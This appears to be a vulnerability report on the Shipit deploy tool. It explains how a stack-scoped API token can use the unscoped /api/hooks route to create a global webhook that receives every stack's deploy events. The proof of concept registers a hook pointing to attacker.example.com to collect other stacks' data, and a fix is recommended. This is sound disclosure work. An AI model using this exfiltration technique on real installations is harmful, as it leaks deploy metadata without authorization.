### Title
Stack-scoped `ApiClient` tokens can create global hooks and read/exfiltrate every other stack's deploy state - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`ApiClient#check_permissions!` only enforces the `operation:scope` permission string (e.g. `write:hook`) and never checks whether the client is bound to a specific `stack_id`. `Api::HooksController` has both a stack-scoped route (`/api/stacks/:stack_id/hooks`) and a global route (`/api/hooks`) mapped to the same controller. When the global route is used, `HooksController#stack_id` short-circuits to `nil` without ever calling the stack-scoping helper (`stack`/`stacks`), so a token that is supposed to be restricted to one stack can create a hook with `stack_id: nil`. Because `Hook.for_stack` matches `where(stack_id: [nil, stack_id])`, that "global" hook subsequently receives every event (`deploy`, `rollback`, `task`, `stack`, `commit_status`, etc.) for **every** stack in the installation, breaking the binding: *the stack a token authorises == the stack it touches*.

### Finding Description
`ApiClient` records can be scoped to a single stack via `belongs_to :stack, optional: true` and the intended restriction is implemented in `Api::BaseController#stacks`: [1](#0-0) 

This scoping is enforced through `stack.from_param!` — but only when a controller action actually calls `stack`/`stacks`. Permission checks themselves are scope-string only and stack-agnostic: [2](#0-1) 

`Api::HooksController` requires only the `write:hook` permission for `create`, with no stack binding check: [3](#0-2) 

The controller's `stack_id` helper deliberately returns `nil` unless a `:stack_id` route param is present, i.e. for the global, non-nested route: [4](#0-3) 

Both the nested route (`/api/stacks/:stack_id/hooks`) and the global route (`/api/hooks`) are wired to this same controller in `config/routes.rb`: [5](#0-4) 

When `create` is invoked through the global route, `hooks` resolves to `Hook.where(stack_id: nil)` — it never touches `stack`/`stacks`, so the fact that `current_api_client.stack_id?` is true (i.e. the token is supposed to be locked to one stack) is silently ignored. A hook created this way is persisted with `stack_id: nil`, making it a "global" hook per `Hook.scope :global, -> { where(stack_id: nil) }`.

Delivery selection then treats a global hook as applicable to any stack: [6](#0-5) 

`for_stack(stack_id)` matches `where(stack_id: [nil, stack_id])`, so any event emitted for **any** stack (`Hook.emit` called from deploy/rollback/task lifecycle code, commit statuses, lock changes, etc.) will be delivered to a hook the attacker created that carries `stack_id: nil`, even though the attacker's token (`current_api_client.stack_id`) was scoped to a single, different stack.

The controller test suite even documents that `/api/hooks` (no `stack_id`) yields "global hooks", confirming the intended vs. actual binding gap: [7](#0-6) 

**Equality that is broken:** `stack the token authorises (ApiClient#stack_id)` ≠ `stack(s) whose events the created Hook touches (Hook#stack_id == nil ⇒ all stacks)`.

### Impact Explanation
An `ApiClient` deliberately scoped to a single stack (e.g. a CI integration token meant only to see/manage one repository's deploys) that happens to also carry the `write:hook` permission can call `POST /api/hooks` (the unscoped route) instead of `POST /api/stacks/:stack_id/hooks`. Doing so creates a global `Hook` whose `delivery_url` points to an attacker-controlled server. From then on, the attacker's server receives `stack`, `deploy`, `rollback`, `task`, `commit_status`, `merge_status`, `merge`, `pull_request` and `lock` event payloads for **every stack** managed by the Shipit installation — output URLs, commit SHAs, deploy status/output metadata, lock reasons/authors, etc. — none of which the token was authorized to read. This is an unauthorized cross-stack read of stack state and deploy metadata, matching the High-severity class of "escalation into authorization... unauthenticated/unauthorized read of stack state, task streams or deploy output."

### Likelihood Explanation
Requires only an existing `ApiClient` token that is stack-scoped but was granted the `write:hook` permission (a plausible/common combination for CI integrations that need to register their own webhook). No GitHub App private key, webhook secret, or session is needed — only the API basic-auth token the attacker already legitimately possesses for their own stack. The route mix-up is a one-line difference in the request path (`/api/hooks` vs `/api/stacks/:id/hooks`), making exploitation trivial once the permission is present.

### Recommendation
In `Api::HooksController`, forbid creation of global hooks (`stack_id: nil`) whenever `current_api_client.stack_id?` is true, or unconditionally force `hooks` to be scoped to `current_api_client.stack` when the client itself is stack-bound, regardless of which route/action was hit. More generally, `ApiClient#check_permissions!` (or `Api::BaseController#require_permission!`) should also validate that any stack-scoped resource being created/mutated is consistent with `current_api_client.stack_id` before allowing `write:hook`, `write:stack`, etc. to succeed on unscoped routes.

### Proof of Concept
1. Create (or use) an `ApiClient` with `stack_id` set to Stack A and `permissions` including `write:hook` (e.g. fixture-equivalent to `here_come_the_walrus` but with `write:hook` added).
2. Authenticate with that token and call:
   `POST /api/hooks` with `{ delivery_url: "https://attacker.example.com/collect", events: ["deploy", "task", "commit_status"] }`
   (note: no `stack_id` in the path, unlike the intended `/api/stacks/A/hooks`).
3. This succeeds and creates `Hook.create(stack_id: nil, ...)` because `Api::HooksController#stack_id` returns `nil` for this route, and `require_permission!(:write, :hook)` never checks `current_api_client.stack_id`.
4. Trigger (or wait for) a deploy/rollback/task on Stack B — a stack unrelated to the attacker's token.
5. `Hook.deliver(:deploy, stack_id_B, payload)` selects hooks via `for_stack(stack_id_B)` → `where(stack_id: [nil, stack_id_B])`, which includes the attacker's global hook; the attacker's server at `https://attacker.example.com/collect` receives Stack B's deploy payload despite the attacker's token being scoped only to Stack A.

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
